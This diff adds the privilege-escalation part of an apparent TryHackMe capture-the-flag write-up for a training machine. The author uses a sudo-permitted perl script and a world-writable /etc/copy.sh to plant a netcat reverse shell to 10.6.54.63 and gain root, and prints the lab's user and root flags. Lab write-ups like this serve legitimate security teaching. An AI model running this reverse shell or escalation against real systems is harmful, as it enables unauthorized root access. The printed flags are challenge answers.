@@ -246,14 +246,78 @@ $ cat /home/itguy/user.txt
 THM{63e5bce9271952aad1113b6f1ac28a07}
 ```
 
-#
-> Step
-
 # Post Exploitation
-> Step
+> Privilege Escalation
+25. `sudo -l`
+```bash
+$ sudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-#
-> "`Step
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+```
+26. `cat /home/{USER}/{FILENAME3}.pl`
+```bash
+$ cat /home/itguy/backup.pl
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+```
+27. `cat /etc/{FILENAME4}.sh`
+28. `ls -ali /etc/{FILENAME4}.sh`
+```bash
+$ cat /etc/copy.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+```
+```bash
+$ ls -ali /etc/copy.sh
+1050508 -rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
+```
+29. `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {MACHINE IP} {PORT NUMBER} >/tmp/f" > /etc/copy.sh`
+30. `nc -lvnp {PORT NUMBER}`
+31. `sudo /usr/bin/perl /home/itguy/backup.pl`
+```bash
+$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.54.63 9998 >/tmp/f" > /etc/copy.sh
+```
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 9998
+listening on [any] 9998 ...
+```
+```bash
+$ sudo /usr/bin/perl /home/itguy/backup.pl
+```
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 9998
+listening on [any] 9998 ...
+connect to [10.6.54.63] from (UNKNOWN) [10.10.165.242] 38970
+/bin/sh: 0: can't access tty; job control turned off
+# 
+```
+32. `whoami`
+33. `ls /root`
+34. `cat /root/{ROOT FLAG}.txt`
+```bash
+# whoami
+root
+```
+```bash
+# ls /root
+root.txt
+```
+```bash
+# cat /root/root.txt
+THM{6637f41d0177b6f37cb20d775124699f}
+```
+
+**Room completed!**
+![]()
+
+# Command History
+
+# Dissecting Some Commands
 
 # Contributions
 This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)
